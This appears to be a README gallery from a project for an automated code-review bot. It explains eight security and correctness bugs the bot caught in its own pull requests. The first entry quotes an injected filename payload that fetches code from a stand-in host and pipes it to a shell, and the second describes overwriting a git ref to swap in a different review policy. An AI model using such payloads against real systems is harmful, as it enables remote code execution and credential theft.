# Review Examples

A small gallery of reviews where knightwatch caught something genuinely non-obvious — the kind of failure mode a careful human reader would have shipped.

Each entry links to the original review comment, embeds a screenshot of what the bot posted, and explains why the catch matters. Ordered from most to least impressive.

---

## 1. Shell injection via `eval` of PR-controlled filenames

**Review:** [knightwatch-reviewer#25 — `dead-code-eval`](https://github.com/srosro/knightwatch-reviewer/pull/25#issuecomment-4350469713)

![PR #25 — shell injection via eval](examples/01-pr25-shell-injection.png)

The new dead-code specialist runs detection commands assembled from filenames inside the PR's diff, then passes the assembled string through `eval` in `DEAD_CODE_CMDS`. The bot caught that a filename like `'; curl evil/x | sh; '` would execute on the reviewer's host with its `gh` credentials and local repo access.

Why it tops the list: this is direct RCE on the reviewer's host with full GitHub auth. The catch is non-obvious because the *outer* command (`grep`, `find`) looks safe — the injection seam is in the substring being interpolated, which only matters once you trace the data path back to PR-controlled filenames.

---

## 2. TOCTOU rewriting `origin/<default_branch>` mid-review

**Review:** [knightwatch-reviewer#29 — `.knightwatch` config TOCTOU](https://github.com/srosro/knightwatch-reviewer/pull/29#issuecomment-4357168423)

![PR #29 — TOCTOU on origin/<default_branch>](examples/02-pr29-toctou.png)

The reviewer reads policy files (`.knightwatch/siblings`, `.knightwatch/dead-code.sh`, `.knightwatch/strict-typing.sh`) from `origin/<default_branch>` to get the trusted, base-branch-owned review configuration. But the worker also runs the PR's own `just test` *before* those reads — and a PR's test could call `git update-ref refs/remotes/origin/main <attacker-sha>` to silently overwrite that ref locally.

Multi-step trust-boundary bypass: timing window + git capability + assumed-immutable ref all have to land at once for a reviewer to see the bug. The PR effectively substitutes its own review policy while still appearing base-branch-owned.

---

## 3. `PrivateTmp=yes` defeating `/tmp` cross-tick locks

**Review:** [knightwatch-reviewer#18 — detached workers + PrivateTmp](https://github.com/srosro/knightwatch-reviewer/pull/18#issuecomment-4346528399)

![PR #18 — PrivateTmp defeating /tmp locks](examples/04-pr18-private-tmp-locks.png)

The systemd unit uses `PrivateTmp=yes`, and detached workers were holding their per-PR locks under `/tmp/pr-review-locks/<pr>`. The bot caught that `PrivateTmp` gives every `systemctl start` a fresh per-execution `/tmp` namespace — so the lockfiles from tick N are invisible to tick N+1.

Result: two workers can launch concurrently for the same PR and `rm -rf` each other's checkout mid-review. The catch hinges on knowing exactly how systemd's tmpfs namespacing interacts with detached processes — the kind of detail almost everyone reading this code would assume "lockfile in `/tmp` = cross-process exclusion" and move on.

---

## 4. `git clone --shared` silently losing the base ref

**Review:** [knightwatch-reviewer#36 — non-default-base PRs lose `origin/<base>`](https://github.com/srosro/knightwatch-reviewer/pull/36#issuecomment-4359749179)

![PR #36 — clone --shared losing base ref](examples/05-pr36-clone-shared-base.png)

For non-default-base PRs (release branches, feature bases) the worker does `git fetch origin <BASE_REF>` into the canonical clone, then `git clone --shared` into the per-PR workdir. The bot caught that `--shared` exposes canonical's *local* branches as `origin/*` but does not reliably copy `refs/remotes/origin/<BASE_REF>`.

So in the per-PR workdir, `origin/<BASE_REF>` is silently absent, the diff snaps to whatever local default exists, and reviews use the wrong base — but only on PRs whose base is not the default branch. A failure class invisible to default-branch testing, plus an interaction with `clone --shared` semantics most people misremember.

---

## 5. Cross-repo search authorization leak

**Review:** [knightwatch-reviewer#25 — `cross-repo-search-trust`](https://github.com/srosro/knightwatch-reviewer/pull/25#issuecomment-4350469713)

![PR #25 — cross-repo search auth leak](examples/03-pr25-cross-repo-leak.png)

A separate finding inside the same review body as #1: the dead-code specialist greps across canonical's local clones, which share an object database with sibling repos. Authorization is checked only against the *reviewed* repo, not against each sibling whose lines might be returned.

A collaborator with access to repo A could cause private sibling-repo B's paths and lines to be quoted into A's review. Classic confused-deputy across what looks like one trust boundary but is actually two.

---

## 6. Aborted aggregator outputs staged as prior reviews

**Review:** [knightwatch-reviewer#15 — `prior-reviews.md` from aborted runs](https://github.com/srosro/knightwatch-reviewer/pull/15#issuecomment-4344887837)

![PR #15 — aborted aggregator output staged as prior review](examples/06-pr15-aborted-aggregator.png)

The orchestrator stages the aggregator's output as `prior-reviews.md` so the next round's bug-class-recurrence pass can compare against it. The bot caught that this staging happened even when the aggregator exited non-zero but left non-empty partial output.

Result: a truncated, half-rendered aggregator dump becomes the canonical "previous review" — fabricating recurrence evidence from reviews the author never saw. The subtle failure mode is that partial data is *worse* than no data, because it actively misleads the next pass instead of forcing it to start fresh.

---

## 7. Substring-triggered `/srosro-approve` approvals

**Review:** [knightwatch-reviewer#14 — `is_approve_request` substring match](https://github.com/srosro/knightwatch-reviewer/pull/14#issuecomment-4344404933)

![PR #14 — substring-triggered approval](examples/08-pr14-substring-approve.png)

The approval poller checked comment bodies with `grep -qiF '/srosro-approve'` and treated any match as an approval command. The bot caught that a trusted collaborator writing "don't use `/srosro-approve` yet" or "we should add `/srosro-approve` later" would trigger a real `gh pr review --approve` side effect.

A substring-vs-command-parse mismatch with real production blast radius — a single misquoted phrase in a normal-looking comment would auto-approve a PR.

---

## 8. Merge-from-main hunks miscredited as branch-authored

**Review:** [knightwatch-reviewer#28 — review-scope diff includes upstream hunks](https://github.com/srosro/knightwatch-reviewer/pull/28#issuecomment-4356784178)

![PR #28 — merge-from-main hunks miscredited](examples/07-pr28-merge-from-main.png)

The review-scope diff (`git diff base..head`) includes hunks the PR author never touched if they merged main and the merge brought along upstream changes to the same files. Those hunks were getting attributed to the PR author in findings.

A fairness regression: the bot would blame an author for code they only inherited via a merge. Real, but the easiest of the eight to spot once you sit down and think carefully about diff-base semantics — which is why it lands at the bottom of this list.
